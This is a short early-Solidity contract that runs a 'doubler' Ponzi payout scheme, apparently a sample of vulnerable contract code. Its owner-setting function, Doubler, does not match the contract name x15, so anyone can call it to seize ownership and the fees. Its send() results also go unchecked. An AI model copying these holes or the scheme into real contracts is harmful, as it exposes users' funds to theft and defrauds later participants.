1 contract x15{
2 
3     struct Participant {
4         address etherAddress;
5         uint amount;
6     }
7 
8     Participant[] public participants;
9 
10     uint public payoutIdx = 0;
11     uint public collectedFees;
12     uint public balance = 0;
13 
14     address public owner;
15 
16     // simple single-sig function modifier
17     modifier onlyowner { if (msg.sender == owner) _ }
18 
19     // this function is executed at initialization and sets the owner of the contract
20     function Doubler() {
21         owner = msg.sender;
22     }
23 
24     // fallback function - simple transactions trigger this
25     function() {
26         enter();
27     }
28     
29     function enter() {
30         if (msg.value < 1 ether) {
31             msg.sender.send(msg.value);
32             return;
33         }
34 
35       	// add a new participant to array
36         uint idx = participants.length;
37         participants.length += 1;
38         participants[idx].etherAddress = msg.sender;
39         participants[idx].amount = msg.value;
40         
41         // collect fees and update contract balance
42         if (idx != 0) {
43             collectedFees += msg.value / 30;
44             balance += msg.value;
45         } 
46         else {
47             // first participant has no one above him,
48             // so it goes all to fees
49             collectedFees += msg.value;
50         }
51 
52 	// if there are enough ether on the balance we can pay out to an earlier participant
53         if (balance > participants[payoutIdx].amount * 2) {
54             uint transactionAmount = 2 * (participants[payoutIdx].amount - participants[payoutIdx].amount / 30);
55             participants[payoutIdx].etherAddress.send(transactionAmount);
56 
57             balance -= participants[payoutIdx].amount * 2;
58             payoutIdx += 1;
59         }
60     }
61 
62     function collectFees() onlyowner {
63         if (collectedFees == 0) return;
64 
65         owner.send(collectedFees);
66         collectedFees = 0;
67     }
68 
69     function setOwner(address _owner) onlyowner {
70         owner = _owner;
71     }
72 }